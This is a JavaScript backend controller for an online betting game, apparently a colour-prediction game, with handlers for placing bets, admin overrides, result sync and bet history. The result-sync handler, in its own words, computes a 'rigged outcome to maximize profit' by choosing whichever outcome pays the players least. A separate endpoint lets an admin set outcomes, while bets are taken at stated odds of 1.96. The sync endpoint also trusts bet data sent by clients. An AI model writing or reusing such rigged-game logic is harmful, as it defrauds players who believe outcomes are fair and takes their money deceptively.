const supabase = require('../config/supabase');

// ─── POST /api/game/place-bet ─────────────────────────────────────────────────
const placeBet = async (req, res) => {
  const userId = req.user.id;
  const { game_type, period, amount, selection } = req.body;

  if (!game_type || !period || !amount || !selection) {
    return res.status(400).json({ success: false, error: 'Missing required fields: game_type, period, amount, selection' });
  }

  const betAmount = parseFloat(amount);
  if (betAmount <= 0) {
    return res.status(400).json({ success: false, error: 'Bet amount must be positive' });
  }

  try {
    // Check wallet balance
    const { data: wallet, error: walletErr } = await supabase
      .from('wallets')
      .select('*')
      .eq('user_id', userId)
      .maybeSingle();

    if (walletErr) throw walletErr;
    if (!wallet) return res.status(404).json({ success: false, error: 'Wallet not found' });

    if (parseFloat(wallet.main_balance || 0) < betAmount) {
      return res.status(400).json({ success: false, error: 'Insufficient balance' });
    }

    // Deduct bet amount from wallet
    const walletBefore = parseFloat(wallet.main_balance || 0);
    const { data: newBalance, error: updateErr } = await supabase.rpc('deduct_wallet_balance', { 
      p_user_id: userId, 
      p_amount: betAmount
    });
    if (updateErr || newBalance === null) {
      return res.status(400).json({ success: false, error: 'Failed to place bet. Try again.' });
    }

    // Insert ledger transaction manually since we bypassed credit_wallet_and_log for atomic deduction
    await supabase.from('transactions').insert({
      user_id: userId,
      amount: -betAmount,
      type: 'Bet',
      status: 'Success',
      notes: `${game_type} Period ${period} — ${selection}`,
      previous_balance: walletBefore,
      new_balance: newBalance
    });

    // Record the bet
    const { data: bet, error: betErr } = await supabase
      .from('bets')
      .insert({
        user_id: userId,
        game_type,
        period,
        amount: betAmount,
        selection,
        status: 'pending',
        wallet_before: walletBefore,
        wallet_after: newBalance,
        odds: 1.96 // Standard odds
      })
      .select()
      .single();

    if (betErr) {
      console.error('Failed to create bet row:', betErr);
      throw betErr;
    }

    res.json({ success: true, message: 'Bet placed successfully', bet, main_balance: newBalance });
  } catch (err) {
    console.error('[placeBet]', err.message);
    res.status(500).json({ success: false, error: err.message });
  }
};

// ─── POST /api/game/admin/override ─ Admin sets the outcome ───
const setGameResultOverride = async (req, res) => {
  const { game, period, result } = req.body;
  if (!game) return res.status(400).json({ success: false, error: 'Missing game' });

  try {
    if (!result) {
      // Clear override in global_game_state
      await supabase.from('global_game_state').update({ admin_override: null }).eq('game', game);
      return res.json({ success: true, message: 'Override cleared' });
    }

    // Set override in global_game_state so gameEngine picks it up
    await supabase.from('global_game_state').update({
      admin_override: typeof result === 'object' ? JSON.stringify(result) : JSON.stringify({ label: result })
    }).eq('game', game);

    res.json({ success: true, message: 'Override set globally' });
  } catch (err) {
    console.error('[setGameResultOverride]', err.message);
    res.status(500).json({ success: false, error: err.message });
  }
};

// ─── POST /api/game/result/sync ─ Fetch or create global outcome ───
const fetchOrCreateGameResult = async (req, res) => {
  const { game, period, allBets, multipliersMap, outcomes } = req.body;

  try {
    // 1. Check if result already exists (set by admin or another player who reached 0:00 first)
    const { data: existing } = await supabase
      .from('game_results')
      .select('*')
      .eq('game', game)
      .eq('period', period)
      .maybeSingle();

    if (existing) {
      return res.json({ success: true, result: existing.result, is_override: existing.is_override, profit: existing.profit || 0, totalBets: existing.total_bets || 0 });
    }

    // 2. If it doesn't exist, calculate the rigged outcome to maximize profit
    let maxProfit = -Infinity;
    let bestOutcome = null;
    let finalProfit = 0;
    let totalBetsCount = allBets ? allBets.length : 0;

    if (outcomes && Array.isArray(outcomes) && allBets && Array.isArray(allBets)) {
      for (const outcome of outcomes) {
        let payout = 0;
        for (const bet of allBets) {
          const betSel = String(bet.select).toLowerCase().trim();
          const outLbl = String(outcome.label).toLowerCase().trim();
          if (betSel === outLbl) {
            const multi = multipliersMap?.[bet.select] || multipliersMap?.[betSel] || 2;
            payout += (bet.point || bet.amount || 0) * multi;
          }
        }
        
        const totalPool = allBets.reduce((sum, b) => sum + (b.point || b.amount || 0), 0);
        const profit = totalPool - payout;
        
        if (profit > maxProfit) {
          maxProfit = profit;
          bestOutcome = outcome;
          finalProfit = profit;
        }
      }
    }

    if (!bestOutcome) {
       // Fallback deterministic if calculation fails
       bestOutcome = { label: 'Green', color: ['#28a745'] }; 
    }

    // 3. Save to global database so all other clients get the exact same result
    const { data: inserted, error: insertErr } = await supabase
      .from('game_results')
      .insert({
        game,
        period,
        result: bestOutcome,
        is_override: false,
        profit: finalProfit,
        total_bets: totalBetsCount
      })
      .select('*')
      .maybeSingle();

    if (insertErr && insertErr.code === '23505') {
       // Race condition: another client just inserted it! Fetch theirs.
       const { data: retryData } = await supabase.from('game_results').select('*').eq('game', game).eq('period', period).single();
       return res.json({ success: true, result: retryData.result, is_override: retryData.is_override, profit: retryData.profit || 0, totalBets: retryData.total_bets || 0 });
    }

    res.json({ success: true, result: bestOutcome, is_override: false, profit: finalProfit, totalBets: totalBetsCount });

  } catch (err) {
    console.error('[fetchOrCreateGameResult]', err.message);
    res.status(500).json({ success: false, error: err.message });
  }
};

// ─── GET /api/game/history ───────────────────────────────────────────────────
const getBetHistory = async (req, res) => {
  const userId = req.user.id;
  try {
    const { data: bets, error } = await supabase
      .from('bets')
      .select('*')
      .eq('user_id', userId)
      .order('created_at', { ascending: false });

    if (error) throw error;
    res.json({ success: true, bets });
  } catch (err) {
    console.error('[getBetHistory]', err.message);
    res.status(500).json({ success: false, error: err.message });
  }
};

module.exports = { placeBet, setGameResultOverride, fetchOrCreateGameResult, getBetHistory };
